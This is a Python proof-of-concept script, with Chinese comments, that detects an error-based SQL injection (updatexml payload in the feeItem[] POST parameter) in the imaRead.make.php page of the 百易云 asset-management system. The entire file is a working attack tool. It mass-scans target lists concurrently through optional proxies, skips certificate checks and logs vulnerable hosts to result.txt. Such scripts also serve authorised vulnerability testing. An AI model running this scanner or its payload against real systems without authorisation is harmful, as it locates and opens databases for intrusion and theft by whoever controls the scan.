import argparse
import requests
import urllib3
import sys
import os
from multiprocessing import Pool

# 忽略SSL证书警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 全局代理变量（由main函数设置）
PROXIES = None

BANNER = r"""
   ██╗    ██╗███████╗██╗ ██████╗██╗  ██╗ █████╗  ██████╗ 
   ██║    ██║██╔════╝██║██╔════╝██║  ██║██╔══██╗██╔═══██╗
   ██║ █╗ ██║█████╗  ██║██║     ███████║███████║██║   ██║
   ██║███╗██║██╔══╝  ██║██║     ██╔══██║██╔══██║██║   ██║
   ╚███╔███╔╝███████╗██║╚██████╗██║  ██║██║  ██║╚██████╔╝
    ╚══╝╚══╝ ╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
                                                   
          Author: weichao (围巢)
          Version: 1.0
          Description: 百易云资管系统 imaRead.make.php SQL注入 POC
          漏洞类型: 报错注入 (updatexml)
"""

def poc(url):
    """
    检测单个URL是否存在SQL注入漏洞
    漏洞参数: feeItem[] (POST)
    """
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url   # 默认使用HTTP

    # 构造Payload (原始注入语句)
    payload = "feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        # 发送POST请求，不跟随重定向，跳过证书验证
        resp = requests.post(
            url,
            data=payload,
            headers=headers,
            proxies=PROXIES,
            timeout=10,
            verify=False,
            allow_redirects=False
        )

        # 检测返回内容是否包含报错信息特征
        if resp.status_code == 200 and "XPATH" in resp.text:
            print(f"[+] {url} 存在漏洞")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(f"{url}\n")
            return True
        else:
            print(f"[-] {url} 不存在漏洞")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[!] 请求 {url} 时发生错误: {e}")
        return None

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="百易云资管系统 imaRead.make.php SQL注入检测POC"
    )
    parser.add_argument('-u', '--url', type=str, help='单个URL检测 (例如: http://example.com/imaRead.make.php)')
    parser.add_argument('-f', '--file', type=str, help='批量检测文件 (每行一个URL)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='并发进程数 (默认10)')
    parser.add_argument('--proxy', type=str, help='代理地址 (例如: http://127.0.0.1:7890)')
    args = parser.parse_args()

    # 设置全局代理
    global PROXIES
    if args.proxy:
        PROXIES = {
            "http": args.proxy,
            "https": args.proxy
        }

    # 单URL检测
    if args.url:
        poc(args.url)
        return

    # 批量检测
    if args.file:
        if not os.path.exists(args.file):
            print(f"错误: 文件 '{args.file}' 不存在")
            sys.exit(1)

        with open(args.file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]

        if not urls:
            print("文件中没有有效的URL")
            sys.exit(1)

        print(f"开始批量检测，共 {len(urls)} 个目标，并发进程数: {args.threads}")
        with Pool(processes=args.threads) as pool:
            pool.map(poc, urls)

        print("\n扫描完成！存在漏洞的URL已保存至 result.txt")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()